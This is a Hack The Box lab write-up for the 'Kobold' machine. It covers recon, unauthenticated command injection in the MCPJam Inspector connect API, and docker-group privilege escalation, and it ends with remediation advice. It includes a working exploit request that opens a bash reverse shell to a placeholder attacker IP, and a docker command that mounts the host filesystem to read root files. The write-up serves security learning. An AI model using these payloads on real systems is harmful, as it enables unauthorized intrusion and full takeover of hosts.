<div align="center">

# 🐺 HTB: Kobold

![OS](https://img.shields.io/badge/OS-Linux-FCC624?style=flat-square&logo=linux&logoColor=black)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=flat-square)
![Severity](https://img.shields.io/badge/Max%20Severity-Critical-red?style=flat-square)
![Vector](https://img.shields.io/badge/Vector-Unauth%20RCE-orange?style=flat-square)

`hackthebox` `linux` `mcp` `unauthenticated-rce` `docker-privesc`

</div>

---

> **TL;DR** — An MCP tooling API (MCPJam Inspector) lets an unauthenticated attacker choose what subprocess it launches. That's a shell as `ben`. From there, `ben` sitting in the `docker` group is all it takes to mount the host filesystem into a container and read root's flag — no root shell on the host ever required.

## 📋 Box Info

| | |
|---|---|
| 🖥️ **OS** | Linux |
| 🎯 **Target** | `<TARGET_IP>` |
| 📅 **Date** | March 21, 2026 |
| 🏁 **Outcome** | ✅ Full compromise — user and root flags captured |

## 🔍 Recon

```bash
nmap -p- -sV -sC -T4 --min-rate 5000 <TARGET_IP> -oA evidence/EV-001-nmap-full
```

| Port | Service |
|:---:|---|
| `22` | ssh |
| `80` | http |
| `443` | https |
| `3552` | taserver |

The HTTPS service on 443 fronts `mcp.kobold.htb`, running **MCPJam Inspector** — a debugging/testing UI for MCP servers. MCP servers are normally launched as local subprocesses (spawn a binary, talk to it over stdio), so an API that lets a *remote, unauthenticated* caller choose what gets spawned is worth a closer look. 👀

---

## 🚩 Shell as `ben`

### [F-001] Unauthenticated RCE via MCPJam Inspector Connect API

<table>
<tr><td><b>Severity</b></td><td>🔴 <b>High</b></td></tr>
<tr><td><b>CVE</b></td><td><code>CVE-2026-23744</code></td></tr>
<tr><td><b>Affected</b></td><td><code>https://mcp.kobold.htb/api/mcp/connect</code> (TCP/443)</td></tr>
</table>

The Inspector's `/api/mcp/connect` endpoint takes a `serverConfig` object with `command` and `args` — the values it uses to spawn an MCP server subprocess. There's no validation stopping those values from being `bash -c <anything>`.

> ⚠️ **Root cause:** user-controlled `command`/`args` passed straight to a process-spawn call with no allowlist, no auth. Classic CWE-78-adjacent OS command injection, just wrapped in MCP terminology.

Listener first:

```bash
nc -lvnp 4444
```

Then the exploit request, redirecting the "launch an MCP server" flow into a reverse shell:

```bash
python3 -c "import requests; requests.post('https://mcp.kobold.htb/api/mcp/connect', headers={'Content-Type': 'application/json'}, json={'serverConfig': {'command': 'bash', 'args': ['-c', 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'], 'env': {}}, 'serverId': 'exploit'}, verify=False)"
```

Back at the listener:

```console
connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>] 56156
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ ls
LICENSE
README.md
assets
bin
dist
node_modules
package.json
```

Landing inside the Inspector's own install directory confirms this is exactly the service it looks like, running as `ben`. ✅

```console
ben@kobold:~$ cat user.txt
<USER_FLAG_REDACTED>
```

📎 **Artifacts:** `EV-010` (exploit payload + terminal output) · `EV-011` (reverse shell transcript)

---

## 👑 Shell as `root`

### [F-002] Privilege Escalation via Docker Group Membership

<table>
<tr><td><b>Severity</b></td><td>🔴 <b>High</b></td></tr>
<tr><td><b>Category</b></td><td>Privilege Misconfiguration (Excessive Privileges)</td></tr>
<tr><td><b>Affected</b></td><td>Local user <code>ben</code> (member of <code>docker</code> group)</td></tr>
</table>

Group check is always step one on Linux privesc:

```console
uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
```

`ben` is in `docker`. That's root, full stop — the daemon runs as root, so anyone who can talk to it can ask for a container with the host's `/` bind-mounted in, then read (or write) anything on the host from inside that container.

> 💡 **Why this works:** Docker requires root-equivalent privileges to operate. Group membership in `docker` is functionally the same as passwordless `sudo ALL`.

Any locally-available image works here — it's just being used as a `cat` wrapper:

```bash
docker run -v /:/hostfs --rm --user root --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt
```

```console
<ROOT_FLAG_REDACTED>
```

No root shell on the host ever needed — the container did the reading, and the container ran as root by definition. 🏁

📎 **Artifacts:** `EV-020` (docker group proof + root flag read transcript)

---

## ⏱️ Attack Timeline

| Time (local) | Action | Result | Evidence |
|---|---|---|:---:|
| `15:06` | TCP service discovery | Open: 22/ssh, 80/http, 443/https, 3552/taserver | `EV-001` |
| `15:06` | UDP top-ports check | No open UDP ports observed | `EV-0XX` |
| `~16:0X` | RCE via MCPJam connect API | 🐚 Shell as `ben`, user flag captured | `EV-010` `EV-011` |
| `~16:0X` | Docker group → host mount | 👑 Root flag read via container escape | `EV-020` |

## 🛠️ Remediation

| Finding | Fix |
|---|---|
| **F-001** RCE | Upgrade MCPJam Inspector to `≥1.4.3`, or take it off the public internet entirely — bind to `127.0.0.1` behind an authenticated reverse proxy. The connect API should never accept arbitrary `command`/`args` from an untrusted caller. |
| **F-002** Docker → root | Don't put unprivileged users in `docker` — it's root-equivalent by design. Use rootless Docker, or gate container operations behind tightly-scoped `sudo` rules if shell access is genuinely required. |

## 📦 Evidence Index

| ID | Description | Location |
|---|---|---|
| `EV-001` | Nmap full TCP scan | `./evidence/EV-001-nmap-full.*` |
| `EV-002` | Nmap targeted scan | `./evidence/EV-002-nmap-targeted.*` |
| `EV-010` | RCE exploit payload + output | `./evidence/EV-010-*` |
| `EV-011` | Reverse shell transcript | `./evidence/EV-011-*` |
| `EV-020` | Docker privesc transcript | `./evidence/EV-020-*` |

---

<div align="center">

*Part of the [D4RKGUNN3R Hack The Box Walkthroughs](../) series.*

`⚔️ BUILD // ATTACK // DETECT // DOCUMENT`

</div>
